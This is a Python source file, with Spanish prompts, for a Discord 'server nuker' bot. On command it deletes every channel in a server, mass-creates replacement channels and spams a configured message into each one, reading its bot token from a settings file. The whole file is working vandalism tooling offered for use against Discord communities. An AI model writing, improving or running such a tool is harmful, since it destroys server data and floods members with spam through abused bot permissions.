anyerror = False
try:
  import colorama
  import discord
  from discord.ext import commands
except:
  anyerror = True
if anyerror == True:
  print("Modulos no instalados dale a enter para instarlos.")
  input("")
  try:
    import os
    os.system("pip install discord")
    os.system("pip install colorama")
    print("Modulos instalados, reinicia el programa.")
    input("")
    exit()
  except:
    print("Error al instalar los modulos.")
    input("")
    exit()


try:
    import os
    from os import system
    system("title " + "Discord Server Nuker,   Hecho por LucidCode#6666,   Github: github.com/LucidCode007")
except:
    pass


import json
try:
  json_data = open("settings.json")
  json_data = json.load(json_data)


  prefix = str(json_data["prefix"])
  amount_of_channels_to_create = int(json_data["amount_of_channels_to_create"])
  channel_names = str(json_data["channel_names"])
  token = str(json_data["bot_token"])
  msg = str(json_data["message_to_spam"])
  amount_of_messages_to_send_in_each_channel = int(json_data["amount_of_messages_to_send_in_each_channel"])
except:
  print('Falta el archivo "settings.json", que almacena toda la configuración')
  input("")
  exit()
  



#Bot Code
print("Iniciando el bot")
colorama.init(autoreset=True)
bot = commands.Bot(command_prefix=prefix)
@bot.event
async def on_ready():
  print(colorama.Fore.GREEN + f"{bot.user.name} Bot activo")
@bot.command()
async def nuke(ctx):
  channela = 0
  guilda = 0
  msga = 0
  try:
    await ctx.message.delete()
    print(colorama.Fore.GREEN + "Mensaje Nuke eliminado correctamente")
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
            channela = int(channela) + 1
            print(colorama.Fore.GREEN + f"[{str(channela)}] Canales eliminados correctamente")
        except:
            print(colorama.Fore.RED + "Error al eliminar los canales")
    for u in range(int(amount_of_channels_to_create)):
        try:
            await ctx.guild.create_text_channel(channel_names)
            guilda = int(guilda) + 1
            print(colorama.Fore.GREEN + f"[{str(guilda)}] Canales creador correctamente")
        except:
            print(colorama.Fore.RED + "Error al crear los canales")
    for channel in ctx.guild.channels:
        for u in range(amount_of_messages_to_send_in_each_channel):
            try:
                await channel.send(msg)
                msga = int(msga) + 1
                print(colorama.Fore.GREEN + f"[{str(msga)}] Mensajes enviados")
            except:
                print(colorama.Fore.RED + "Error al enviar los mensajes")
    print(f"Nuke hecho {ctx.guild.id}/{ctx.guild.name}")
  except Exception as e:
      embed = discord.Embed(
          title="Error",
          description="Permisos insuficientees/RateLimit"
      )
      await ctx.send(embed=embed)
bot.run(token, bot=True)
